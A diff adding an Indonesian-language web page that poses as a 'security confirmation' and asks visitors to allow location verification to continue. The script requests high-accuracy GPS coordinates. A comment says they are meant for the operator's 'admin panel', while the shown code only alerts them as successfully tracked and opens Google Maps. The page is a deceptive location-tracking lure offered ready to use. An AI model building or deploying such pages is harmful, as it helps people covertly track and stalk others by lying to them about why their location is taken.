@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <title>Sistem Verifikasi Lokasi</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-gray-100 flex items-center justify-center h-screen">
+    <div class="bg-white p-8 rounded-2xl shadow-xl max-w-sm text-center">
+        <h2 class="text-2xl font-bold mb-4">Konfirmasi Keamanan</h2>
+        <p class="text-gray-600 mb-6">Untuk melanjutkan akses ke konten ini, harap izinkan verifikasi lokasi perangkat Anda.</p>
+        
+        <button onclick="mintaLokasi()" class="bg-blue-600 text-white px-6 py-3 rounded-full font-bold hover:bg-blue-700 transition w-full">
+            SAYA SETUJU & LANJUTKAN
+        </button>
+        
+        <p id="status" class="mt-4 text-sm text-gray-500"></p>
+    </div>
+
+    <script>
+        function mintaLokasi() {
+            const status = document.getElementById('status');
+            if (!navigator.geolocation) {
+                status.innerText = "Browser Anda tidak mendukung GPS.";
+                return;
+            }
+
+            status.innerText = "Sedang memproses...";
+
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    
+                    // Di sini koordinat dikirim ke panel admin Anda
+                    // Untuk simulasi, kita tampilkan saja lewat alert
+                    alert(`LOKASI BERHASIL DILACAK!\nLatitude: ${lat}\nLongitude: ${lon}`);
+                    
+                    // Anda bisa mengarahkan ke Google Maps
+                    window.location.href = `https://www.google.com/maps?q=${lat},${lon}`;
+                },
+                (error) => {
+                    status.innerText = "Akses ditolak oleh pengguna.";
+                    console.error(error);
+                },
+                { enableHighAccuracy: true } // Memaksa GPS memberikan akurasi 100%
+            );
+        }
+    </script>
+</body>
+</html>
